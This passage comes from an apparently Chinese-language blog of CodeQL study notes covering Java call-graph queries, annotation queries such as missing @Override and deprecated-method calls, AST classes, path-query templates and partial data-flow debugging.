Super.getX()，但是实际运行起来调用的是Sub.getX()</p><p>Callable提供了大量的成员谓词，最重要的两个是：</p><ul><li>cl.calls(Callable target)          如果当前调用的callee是target的话，返回true</li><li>polyCalls(Callable target)  如果实际运行可能的callee是target的话，返回true。比如说callee是target或者被target override了的</li></ul><p>在上面这个例子中，<code>Client.main</code>方法调用的是<code>Sub(int)</code>和<code>Super.getX()</code>方法；；另外它<code>polyCalls</code>了方法<code>Sub.getX()</code>。</p><h3 id="举例：寻找未被调用的方法"><a href="#举例：寻找未被调用的方法" class="headerlink" title="举例：寻找未被调用的方法"></a>举例：寻找未被调用的方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Callable callee</span><br><span class="line">where not exists(Callable caller|caller.polyCalls(callee))</span><br><span class="line">select callee</span><br></pre></td></tr></table></figure><p>一个标准Java应用并不会对JDK中的每个库函数都调用可以用<code>fromSource</code>谓词来做过滤。</p><p>我们可以使用谓词<code>fromSource</code>来检查一个编译单元是否是一个源文件，并细化我们的查询。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">from Callable callee</span><br><span class="line">where not exists(Callable caller|caller.polyCalls(callee)) and callee.getCompilationUnit().fromSource()</span><br><span class="line">select callee, &quot;Not called.&quot;</span><br></pre></td></tr></table></figure><p>我们还发现，<code>&lt;clinit&gt;</code>方法未被调用，其实它们本质上是类对象的初始化函数，并不会在任何地方被显示调用。</p><p>同样的，<code>finalize</code>函数其实也是同理，用于销毁内存中的类对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Callable callee</span><br><span class="line">where not exists(Callable caller | caller.polyCalls(callee)) and</span><br><span class="line">    callee.getCompilationUnit().fromSource() and</span><br><span class="line">    not callee.hasName(&quot;&lt;clinit&gt;&quot;) and not callee.hasName(&quot;finalize&quot;)</span><br><span class="line">select callee, &quot;Not called.&quot;</span><br></pre></td></tr></table></figure><p>还有一种特例就是</p><p>在单例模式中，一个类提供了private修饰的空构造方法，防止它被其他类实例化（单例模式）。</p><p>这些结果不应该出现在我们的查询结果中，因为他们的设计意图就是这样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Callable callee</span><br><span class="line">where not exists(Callable caller | caller.polyCalls(callee)) and</span><br><span class="line">    callee.getCompilationUnit().fromSource() and</span><br><span class="line">    not callee.hasName(&quot;&lt;clinit&gt;&quot;) and not callee.hasName(&quot;finalize&quot;) and</span><br><span class="line">    not callee.isPublic() and</span><br><span class="line">    not callee.(Constructor).getNumberOfParameters() &#x3D; 0</span><br><span class="line">select callee, &quot;Not called.&quot;</span><br></pre></td></tr></table></figure><p>实际上很多方法其实都是可用通过反射的方式去调用的，一般来说很难检测这种方法。</p><p>但是CodeQL支持识别JUnit和其他框架的测试类，这些测试类被test runner调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Callable callee</span><br><span class="line">where not exists(Callable caller | caller.polyCalls(callee)) and</span><br><span class="line">    callee.getCompilationUnit().fromSource() and</span><br><span class="line">    not callee.hasName(&quot;&lt;clinit&gt;&quot;) and not callee.hasName(&quot;finalize&quot;) and</span><br><span class="line">    not callee.isPublic() and</span><br><span class="line">    not callee.(Constructor).getNumberOfParameters() &#x3D; 0 and</span><br><span class="line">    not callee.getDeclaringType() instanceof TestClass</span><br><span class="line">select callee, &quot;Not called.&quot;</span><br></pre></td></tr></table></figure><h2 id="Annotations-in-Java"><a href="#Annotations-in-Java" class="headerlink" title="Annotations in Java"></a>Annotations in Java</h2><p>CodeQL中关于Annotation的类：</p><ul><li><code>Annotable</code>类表示所有可以被注解附加的程序元素，比如说package、引用类型、field、method、local_var。</li><li><code>AnnotationType</code>类表示注解这个类型，例如<code>java.langOverride</code>。Java中的注解都是接口。</li><li><code>AnnotationElement</code>类表示某个注解内部的元素，也就是一个注解类型的成员。</li><li><code>Annotation</code>类表示一个注解，例如<code>@Override</code>。注解的value可以通过<code>getValue</code>谓词获得。</li></ul><p>例如，<code>SuppressWarnings</code>是Java官方注解，要求针对某类错误不报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">package java.lang;</span><br><span class="line"></span><br><span class="line">public @interface SuppressWarnings &#123;</span><br><span class="line">    String[] value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SuppressWarnings</code>被表示为<code>AnnotationType</code>，value是他唯一的<code>AnnotationElement</code></p><p>用法举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">    @SuppressWarnings(&quot;rawtypes&quot;)</span><br><span class="line">    public A(java.util.List rawlist) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里，<code>@SuppressWarnings(&quot;rawtypes&quot;)</code>表示的是一个<code>Annotation</code>，<code>&quot;rawtypes&quot;</code>就是该注解的<code>value</code>，这个值可以被谓词<code>getValue</code>获取。</p><p>我们可以寻找加载在cons上面的<code>@SuppressWarning</code> ,返回Annotation本身和value：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">from Constructor c, Annotation ann, AnnotationType anntp</span><br><span class="line">where ann &#x3D; c.getAnAnnotation() and</span><br><span class="line">    anntp &#x3D; ann.getType() and</span><br><span class="line">    anntp.hasQualifiedName(&quot;java.lang&quot;, &quot;SuppressWarnings&quot;)</span><br><span class="line">select ann, ann.getValue(&quot;value&quot;)</span><br></pre></td></tr></table></figure><p>下面这个例子仅仅查询具有单个注解元素，并且名字是value：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from AnnotationType anntp</span><br><span class="line">where forex(AnnotationElement elt |</span><br><span class="line">    elt &#x3D; anntp.getAnAnnotationElement() |</span><br><span class="line">    elt.getName() &#x3D; &quot;value&quot;</span><br><span class="line">)</span><br><span class="line">select anntp</span><br></pre></td></tr></table></figure><h3 id="举例：查询缺失的-Override注解"><a href="#举例：查询缺失的-Override注解" class="headerlink" title="举例：查询缺失的@Override注解"></a>举例：查询缺失的<code>@Override</code>注解</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sub1</span> <span class="keyword">extends</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sub2</span> <span class="keyword">extends</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要找到那些<code>Sub2.m</code>，应该加上<code>@Override</code>注解的方法。</p><p>找到所有的<code>@Override</code>注解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Annotation ann</span><br><span class="line">where ann.getType().hasQualifiedName(&quot;java.lang&quot;,&quot;Override&quot;)</span><br><span class="line">select ann</span><br></pre></td></tr></table></figure><p>回找到很多类似<code>Sub1.m()</code>的方法。</p><p>接下俩可以将<code>@Override</code>注解进行一个封装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class OverrideAnnotation extends Annotation &#123;</span><br><span class="line">    OverrideAnnotation() &#123;</span><br><span class="line">        this.getType().hasQualifiedName(&quot;java.lang&quot;, &quot;Override&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们选择<code>override</code>谓词去寻找是否一个方法override了另一个方法。</p><p>和<code>getAnAnnotation</code>谓词(适用在任何Annotatable类上)来获得一些注释。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">from Method overriding, Method overridden</span><br><span class="line">where overriding.overrides(overridden) and</span><br><span class="line">not overriding.getAnAnnotation() instanceof OverrideAnnotation and</span><br><span class="line">overriding.fromSource()</span><br><span class="line">select overriding, &quot;Method overrides another method, but does not have an @Override annotation.&quot;</span><br></pre></td></tr></table></figure><h3 id="举例：查询调用-deprecated方法"><a href="#举例：查询调用-deprecated方法" class="headerlink" title="举例：查询调用@deprecated方法"></a>举例：查询调用<code>@deprecated</code>方法</h3><p>封装<code>@Deprecated</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class DeprecatedAnnotation extends Annotation &#123;</span><br><span class="line">    DeprecatedAnnotation() &#123;</span><br><span class="line">        this.getType().hasQualifiedName(&quot;java.lang&quot;, &quot;Deprecated&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class DeprecatedMethod extends Method &#123;</span><br><span class="line">DeprecatedMethod() &#123;</span><br><span class="line">        this.getAnAnnotation() instanceof DeprecatedAnnotation</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Call call</span><br><span class="line">where call.getCallee() instanceof DeprecatedMethod and</span><br><span class="line">not call.getCaller() instanceof DeprecatedMethod</span><br><span class="line">select call, &quot;This call invokes a deprecated method.&quot;</span><br></pre></td></tr></table></figure><h3 id="提升"><a href="#提升" class="headerlink" title="提升"></a>提升</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">    @Deprecated void m() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    @Deprecated void n() &#123;</span><br><span class="line">        m();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @SuppressWarnings(&quot;deprecated&quot;)</span><br><span class="line">    void r() &#123;</span><br><span class="line">        m();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于这个例子，r方法实际上是忽视了调用的<code>Deprecated</code>方法。</p><p>改进：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class SuppressDeprecationWarningAnnotation extends Annotation &#123;</span><br><span class="line">    SuppressDeprecationWarningAnnotation() &#123;</span><br><span class="line">        this.getType().hasQualifiedName(&quot;java.lang&quot;, &quot;SuppressWarnings&quot;) and</span><br><span class="line">        this.getAValue().(Literal).getLiteral().regexpMatch(&quot;.*deprecation.*&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为此，我们首先引入一个类来表示所有@SuppressWarnings注释，其中deprecated字符串出现在value列表中。</p><p>value的内容是字符串值，cast到Literal之后，getLiteral到value的字符串值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Insert the class definitions from above</span><br><span class="line"></span><br><span class="line">from Call call</span><br><span class="line">where call.getCallee() instanceof DeprecatedMethod</span><br><span class="line">    and not call.getCaller() instanceof DeprecatedMethod</span><br><span class="line">    and not call.getCaller().getAnAnnotation() instanceof SuppressDeprecationWarningAnnotation</span><br><span class="line">select call, &quot;This call invokes a deprecated method.&quot;</span><br></pre></td></tr></table></figure><h2 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h2><p><a href="https://codeql.github.com/docs/codeql-language-guides/abstract-syntax-tree-classes-for-working-with-java-programs/" target="_blank" rel="noopener">CodeQL for AST</a></p><p>抽象语法树上的节点都是语句和表达式。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">AST</span><br><span class="line">├── Statement (Stmt)</span><br><span class="line">└── Expression (Expr)</span><br><span class="line">    ├── Literal 字面量 </span><br><span class="line">    │   ├── BooleanLiteral</span><br><span class="line">    │   ├── IntegerLiteral</span><br><span class="line">    │   ├── LongLiteral</span><br><span class="line">    │   ├── FloatingPointLiteral</span><br><span class="line">    │   ├── DoubleLiteral</span><br><span class="line">    │   ├── CharacterLiteral</span><br><span class="line">    │   ├── StringLiteral</span><br><span class="line">    │   └── NullLiteral</span><br><span class="line">    ├── Unary expression 一元表达式</span><br><span class="line">    ├── Binary expression 二元表达式</span><br><span class="line">    ├── Assignment expression 赋值表达式</span><br><span class="line">    ├── Access </span><br><span class="line">    └── Miscellaneous</span><br></pre></td></tr></table></figure><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/image-20220106093348817.png" alt="image-20220106093348817" style="zoom:50%;"><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/image-20220106093406308.png" alt="image-20220106093406308" style="zoom:50%;"><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/image-20220106093445663.png" alt="image-20220106093445663" style="zoom: 33%;"><h2 id="Java官方例子"><a href="#Java官方例子" class="headerlink" title="Java官方例子"></a>Java官方例子</h2><p><a href="https://codeql.github.com/codeql-query-help/java/" target="_blank" rel="noopener">https://codeql.github.com/codeql-query-help/java/</a></p><p><a href="https://github.com/github/codeql/tree/main/java/ql/examples/snippets" target="_blank" rel="noopener">https://github.com/github/codeql/tree/main/java/ql/examples/snippets</a></p><h2 id="GitHub-Security-Lab"><a href="#GitHub-Security-Lab" class="headerlink" title="GitHub Security Lab"></a>GitHub Security Lab</h2><p><a href="https://securitylab.github.com/research/" target="_blank" rel="noopener">https://securitylab.github.com/research/</a></p><h2 id="Java-路径查询"><a href="#Java-路径查询" class="headerlink" title="Java 路径查询"></a>Java 路径查询</h2><p>模板：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * ...</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * ...</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">import &lt;language&gt;</span><br><span class="line">&#x2F;&#x2F; For some languages (Java&#x2F;C++&#x2F;Python) you need to explicitly import the data flow library, such as</span><br><span class="line">&#x2F;&#x2F; import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">from MyConfiguration config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, &quot;&lt;message&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="path-query-metadata"><a href="#path-query-metadata" class="headerlink" title="path query metadata"></a>path query metadata</h3><p>类似<code>@kind path-probleam</code></p><h3 id="generate-path-explanation"><a href="#generate-path-explanation" class="headerlink" title="generate path explanation"></a>generate path explanation</h3><p>生成路径解释</p><p>需要定义一个名为<code>edges</code>的谓词，用于约束图中的边的关系。</p><p>需要定义一个名为<code>node</code>的谓词，用于约束图中的节点的特性。</p><p>也可以导入现有图模块，它们内部就有谓词edges定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import DataFlow::PathGraph</span><br></pre></td></tr></table></figure><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9B%9B/image-20211102184158889.png" alt="image-20211102184158889" style="zoom:50%;"><h3 id="delcare-sources-and-sinks"><a href="#delcare-sources-and-sinks" class="headerlink" title="delcare sources and sinks"></a>delcare sources and sinks</h3><p>需要在from语句中，定义source和sink的类型和定义。</p><p>实际上，如果import了<code>DataFlow::PathGraph</code>模块，实际上可以直接使用<code>Configuration</code>类，可以：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from DataFlow::Configuration config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br></pre></td></tr></table></figure><p><code>DataFlow::Configuration</code>是一个bastract类，实际上它内部定义了两个关键谓词：</p><ul><li><code>isSource()</code> defines where data may flow from.</li><li><code>isSink()</code> defines where data may flow to.</li></ul><h4 id="define-flow-conditions"><a href="#define-flow-conditions" class="headerlink" title="define flow conditions"></a>define flow conditions</h4><p>模板：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line"></span><br><span class="line">select element, source, sink, string</span><br></pre></td></tr></table></figure><h2 id="排查故障"><a href="#排查故障" class="headerlink" title="排查故障"></a>排查故障</h2><h3 id="确定变量的具体类型"><a href="#确定变量的具体类型" class="headerlink" title="确定变量的具体类型"></a>确定变量的具体类型</h3><p>如果你不熟悉查询中使用的库，你可以使用CodeQL来确定一个实体有哪些类型。有一个称为<code>getAQlClass()</code>的谓词，它返回调用这个谓词的实体的最具体的QL类型。</p><p>比如说，如果你正在使用一个Java数据库，你可能会在一个叫做c的Callable之中的的每个Expr上使用getAQlClass()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Expr e, Callable c</span><br><span class="line">where</span><br><span class="line">    c.getDeclaringType().hasQualifiedName(&quot;my.namespace.name&quot;, &quot;MyClass&quot;)</span><br><span class="line">    and c.getName() &#x3D; &quot;c&quot;</span><br><span class="line">    and e.getEnclosingCallable() &#x3D; c</span><br><span class="line">select e, e.getAQlClass()</span><br></pre></td></tr></table></figure><p>这个查询的结果是该函数中每个Expr的最具体类型的列表。对于由多个类型表示的表达式，你会看到多个结果，所以它可能会返回一个非常大的结果表。</p><p>把getAQlClass()作为一个调试工具，但不要把它包含在你的查询的最终版本中，因为它拖慢了性能。</p><h2 id="Debugging-data-flow-queries-using-partial-flow"><a href="#Debugging-data-flow-queries-using-partial-flow" class="headerlink" title="Debugging data-flow queries using partial flow"></a>Debugging data-flow queries using partial flow</h2><p>常规数据流路径查询模板：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class MyConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  MyConfig() &#123; this &#x3D; &quot;MyConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node node) &#123; node instanceof MySource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node node) &#123; node instanceof MySink &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from MyConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, &quot;Sink is reached from $@.&quot;, source.getNode(), &quot;here&quot;</span><br></pre></td></tr></table></figure><p>简化版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from MyConfig config, DataFlow::Node source, DataFlow::Node sink</span><br><span class="line">where config.hasPath(source, sink)</span><br><span class="line">select sink, &quot;Sink is reached from $@.&quot;, source.getNode(), &quot;here&quot;</span><br></pre></td></tr></table></figure><p>但现实情况经常会遇到数据流断裂的情况，这是可以使用局部数据流进行调试</p><h3 id="步骤一：检查Source和Sink"><a href="#步骤一：检查Source和Sink" class="headerlink" title="步骤一：检查Source和Sink"></a>步骤一：检查Source和Sink</h3><p><strong>谓词fieldFlowBranchLimit</strong></p><p>数据流配置包含一个叫做fieldFlowBranchLimit的参数。如果这个值设置得太高，你可能会遇到性能下降，但如果它太低，你可能会错过结果。在调试数据流时，尝试将fieldFlowBranchLimit设置为一个高值，看看你的查询是否会产生更多的结果。例如，尝试在你的配置中加入以下内容。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="built_in">int</span> fieldFlowBranchLimit() &#123; result = <span class="number">5000</span> &#125;</span><br></pre></td></tr></table></figure><p>如果仍然没有结果，而且性能还可以使用，那么最好在做进一步调试时将此设置为高值。</p><h3 id="步骤二：局部数据流"><a href="#步骤二：局部数据流" class="headerlink" title="步骤二：局部数据流"></a>步骤二：局部数据流</h3><p>Configuration.hasPartialFlow谓词、</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span>Holds if there is </span>a<span class="markdown"> partial data flow path from <span class="code">`source`</span> to <span class="code">`node`</span>. The</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span>approximate distance between <span class="code">`node`</span> and </span>the<span class="markdown"> closest source is <span class="code">`dist`</span> and</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span>is restricted to be less than or equal to <span class="code">`explorationLimit()`</span>. This</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span>predicate completely disregards sink definitions.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"> *</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span>This predicate is intended for dataflow exploration and debugging and may</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span>perform poorly if </span>the<span class="markdown"> number of sources is too big and/or </span>the<span class="markdown"> exploration</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span>limit is set too high without using barriers.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"> *</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span>This predicate is disabled (has no results) by default. Override</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span><span class="code">`explorationLimit()`</span> with </span>a<span class="markdown"> suitable number to enable this predicate.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"> *</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span>To use this in </span>a<span class="markdown"> <span class="code">`path-problem`</span> query, import </span>the<span class="markdown"> module <span class="code">`PartialPathGraph`</span>.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"> */</span></span></span><br><span class="line"><span class="keyword">final</span> predicate hasPartialFlow(PartialPathNode source, PartialPathNode node, <span class="built_in">int</span> dist) &#123;</span><br></pre></td></tr></table></figure><p>该谓词用与数据流的探索</p><p>@kind path-problem</p><p>import DataFlow::PartialPathGraph(不要引入PathGraph模块，否则会报错)</p><p>dis是大概距离，该谓词完全不理会你的sink定义</p><p>首先，你必须override一下explorationLimit()谓词</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="built_in">int</span> explorationLimit() &#123; result = <span class="number">5</span> &#125;</span><br></pre></td></tr></table></figure><p>这里的5就是数据流搜索半径</p><p>一个不错的使用示例子：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">predicate adhoc<span class="constructor">PartialFlow(Callable <span class="params">c</span>, PartialPathNode <span class="params">n</span>, Node <span class="params">src</span>, <span class="params">int</span> <span class="params">dist</span>)</span> &#123;</span><br><span class="line">  exists(MyConfig conf, PartialPathNode source <span class="pattern-match">|</span></span><br><span class="line"><span class="pattern-match">    conf.has<span class="constructor">PartialFlow(<span class="params">source</span>, <span class="params">n</span>, <span class="params">dist</span>)</span> <span class="keyword">and</span></span></span><br><span class="line"><span class="pattern-match">    src = source.get<span class="constructor">Node()</span> <span class="keyword">and</span></span></span><br><span class="line"><span class="pattern-match">    c = n.get<span class="constructor">Node()</span>.get<span class="constructor">EnclosingCallable()</span></span></span><br><span class="line"><span class="pattern-match">  )</span></span><br><span class="line"><span 